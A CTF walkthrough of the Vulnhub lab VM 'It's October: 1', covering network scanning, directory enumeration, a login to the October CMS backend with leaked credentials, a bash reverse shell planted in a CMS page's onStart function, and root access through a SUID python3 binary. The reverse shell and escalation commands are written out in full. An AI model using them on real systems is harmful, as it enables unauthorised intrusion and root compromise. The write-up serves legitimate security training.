|[Home](/README.md)|[Projects](/projects.md)|[Articles](/articles.md)|[Apophthegm](/apophthegm.md)|[About](/about.md)|

# **It's October: 1**

The virtual machine is released on April 8, 2020 at Vulnhub.  The goal is to get the root flag of the target.  However, it encourages you to use the functionalities rather than vulnerabilities of the target.  It is designed to test your penetration testing skills and concepts.

Available on : [Vulnhub](https://www.vulnhub.com/entry/its-october-1,460/)  
Difficulty : Easy/Medium Level  
Format : OVA (Virtualbox)

Kali Linux 2020.1b is used for the testing.

The VM shows the IP address of the box when you boot it up.  However, you can confirm the IP address on your own.

```bash
sudo netdiscover -r 10.0.2.0/24
```

![](https://raw.githubusercontent.com/samiux/images/master/october/001.png)  

The target's IP address is ```10.0.2.31```.

```bash
sudo nmap -Pn -p- -sS -sV -A 10.0.2.31
```

![](https://raw.githubusercontent.com/samiux/images/master/october/002.png)

The screenshot of ```http://10.0.2.31``` is :

![](https://raw.githubusercontent.com/samiux/images/master/october/003.png)

The screenshot of ```http://10.0.2.31:8080``` is :

![](https://raw.githubusercontent.com/samiux/images/master/october/004.png)

Inspect the source code of port 8080 and find ```mynote.txt``` on the page.  Let's access the ```mynote.txt```.  It shows the username and password.  However, we do not know the admin page yet.  It is suspected to be on port 80 instead of 8080.

![](https://raw.githubusercontent.com/samiux/images/master/october/005.png)

![](https://raw.githubusercontent.com/samiux/images/master/october/006.png)

We need to find out the admin page of the port 80 by gobuster.  We need to set the threads to 5 or errors may be shown.

```bash
sudo gobuster dir -u http://10.0.2.31 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t5
```

When access ```backend``` directory, the admin panel page is shown.

![](https://raw.githubusercontent.com/samiux/images/master/october/007.png)

![](https://raw.githubusercontent.com/samiux/images/master/october/008.png)

Log in with username ```admin``` and password ```adminadmin2```.

![](https://raw.githubusercontent.com/samiux/images/master/october/009.png)

The version is ```build 465``` and it is the current version as at the time of this writing.  The is no known vulnerability found so far.

After reading the documentation of the ```October CMS```, it is suspected that it is desgined to run ```JavaScript``` by default.  Let's confirm it!

```html
<html>
<body>
	<script>alert("xss");</script>
</body>
</html>
```

![](https://raw.githubusercontent.com/samiux/images/master/october/012.png)

![](https://raw.githubusercontent.com/samiux/images/master/october/010.png)

![](https://raw.githubusercontent.com/samiux/images/master/october/011.png)

It is confirmed that it can run ```JavasScript``` by default.  Let's use ```onStart()``` function to execute the bash shell.

```javascript
function onstart() {
	exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.24/4444 0>&1'");
}
```

![](https://raw.githubusercontent.com/samiux/images/master/october/013.png)

The netcat listener at port 4444 on Kali Linux.

```bash
nc -lvp 4444
```

![](https://raw.githubusercontent.com/samiux/images/master/october/014.png)

After saved the page and ```review``` it.  The shell is ported accordingly.

![](https://raw.githubusercontent.com/samiux/images/master/october/015.png)

The current user is ```www-data```.  We need to find a way for privilege escalation.

```bash
find / -perm -u=s -type f 2>/dev/null
```

The output shows that ```python3.7``` is in stricty bit.  We try to privilege escalate it.

```bash
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

As a result, we get ```euid=0(root)``` after running the above command.

We then go to the /root and display the ```proof.txt```.  Bingo!  Root is dancing!

![](https://raw.githubusercontent.com/samiux/images/master/october/016.png)

### Final thought

This is a typical Capture The Flag (CTF) game, however, it does not use the vulnerability to exploit it.  It is very a interesting box indeed!

Samiux  
OSCE  OSCP  OSWP  
April 19, 2020, Hong Kong, China  


|[Home](/README.md)|[Projects](/projects.md)|[Articles](/articles.md)|[Apophthegm](/apophthegm.md)|[About](/about.md)|
